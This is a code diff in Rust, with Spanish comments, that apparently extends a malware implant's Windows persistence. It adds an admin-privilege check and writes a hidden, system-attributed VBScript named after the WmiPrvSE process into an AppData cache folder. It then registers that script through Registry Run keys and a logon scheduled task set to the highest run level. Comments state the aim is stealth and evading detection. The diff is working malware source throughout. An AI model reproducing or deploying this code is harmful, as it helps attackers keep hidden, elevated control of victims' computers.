@@ -98,8 +98,69 @@ fn get_current_exe_path() -> Result<PathBuf, String> {
         .map_err(|e| format!("Error obteniendo exe actual: {}", e))
 }
 
+/// Verifica si el proceso actual tiene privilegios de administrador
+#[cfg(target_os = "windows")]
+fn check_admin_privileges() -> bool {
+    let output = Command::new("cmd")
+        .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
+        .creation_flags(0x08000000)
+        .output();
+    
+    if let Ok(out) = output {
+        let result = String::from_utf8_lossy(&out.stdout).trim().to_string();
+        return result == "Admin";
+    }
+    false
+}
+
+/// Crea un VBScript que ejecuta el ejecutable con privilegios elevados (sin UAC prompt)
+/// Este VBScript será llamado por la persistencia para mantener privilegios admin
+#[cfg(target_os = "windows")]
+fn create_elevation_vbs(exe_path: &str) -> Result<String, String> {
+    use std::fs;
+    
+    // Crear VBScript en una ubicación sigilosa
+    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
+    let vbs_dir = format!("{}\\Microsoft\\Windows\\Caches", appdata);
+    
+    // Crear directorio si no existe
+    let _ = fs::create_dir_all(&vbs_dir);
+    
+    let vbs_name = format!("WmiPrvSE_{}.vbs", std::process::id());
+    let vbs_path = format!("{}\\{}", vbs_dir, vbs_name);
+    
+    // VBScript que ejecuta con runas (ShellExecute)
+    let vbs_content = format!(
+        r#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "{}", "", "", "runas", 0"#,
+        exe_path.replace("\\", "\\\\")
+    );
+    
+    fs::write(&vbs_path, vbs_content)
+        .map_err(|e| format!("Error creando VBScript: {}", e))?;
+    
+    // Establecer atributo oculto
+    let _ = Command::new("attrib")
+        .args(&["+h", "+s", &vbs_path])
+        .creation_flags(0x08000000)
+        .output();
+    
+    Ok(vbs_path)
+}
+
+#[cfg(not(target_os = "windows"))]
+fn check_admin_privileges() -> bool {
+    false
+}
+
+#[cfg(not(target_os = "windows"))]
+fn create_elevation_vbs(_exe_path: &str) -> Result<String, String> {
+    Err("Not supported on non-Windows".to_string())
+}
+
 /// Implementa persistencia mediante Registry Run key
 /// MEJORADO: Sin copiar archivos, usa rutas ofuscadas con cmd /c
+/// Si se detectan privilegios admin, crea un VBScript wrapper para mantener elevación
 #[cfg(target_os = "windows")]
 fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -117,9 +178,17 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let pid = std::process::id() as usize;
     let reg_name = reg_names[pid % reg_names.len()];
     
-    // OFUSCACIÓN: Usar cmd /c start /min para reducir detección
-    // El "/min" hace que se ejecute minimizado (menos visible)
-    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
+    // Detectar si tenemos privilegios admin
+    let is_admin = check_admin_privileges();
+    
+    let obfuscated_cmd = if is_admin {
+        // Si somos admin, crear un VBScript que ejecute con privilegios elevados
+        let vbs_path = create_elevation_vbs(exe_str)?;
+        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
+    } else {
+        // Usuario normal, ejecución directa
+        format!("cmd.exe /c start /min \"\" \"{}\"", exe_str)
+    };
     
     // Intentar HKCU primero (no requiere admin)
     let output = Command::new("reg")
@@ -164,19 +233,36 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let pid = std::process::id() as usize;
     let task_name = task_names[pid % task_names.len()];
     
-    // OFUSCACIÓN: Usar cmd /c con delay y start /min
-    let obfuscated_cmd = format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str);
+    // Detectar si tenemos privilegios admin
+    let is_admin = check_admin_privileges();
     
-    // Crear tarea con DELAY de 1 minuto para evitar detección inmediata
+    // Si somos admin, usar VBScript wrapper para mantener elevación
+    let task_cmd = if is_admin {
+        let vbs_path = create_elevation_vbs(exe_str)?;
+        format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
+    } else {
+        format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str)
+    };
+    
+    // Crear tarea con HIGHEST run level si somos admin, USER si no
+    let mut args = vec![
+        "/Create",
+        "/SC", "ONLOGON",
+        "/TN", task_name,
+        "/TR", &task_cmd,
+        "/DELAY", "0001:00", // 1 minuto de delay
+    ];
+    
+    // Si somos admin, agregar /RL HIGHEST para mantener privilegios
+    if is_admin {
+        args.push("/RL");
+        args.push("HIGHEST");
+    }
+    
+    args.push("/F");
+    
     let output = Command::new("schtasks")
-        .args(&[
-            "/Create",
-            "/SC", "ONLOGON",
-            "/TN", task_name,
-            "/TR", &obfuscated_cmd,
-            "/DELAY", "0001:00", // 1 minuto de delay
-            "/F",
-        ])
+        .args(&args)
         .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output()
         .map_err(|e| format!("Error ejecutando schtasks: {}", e))?;
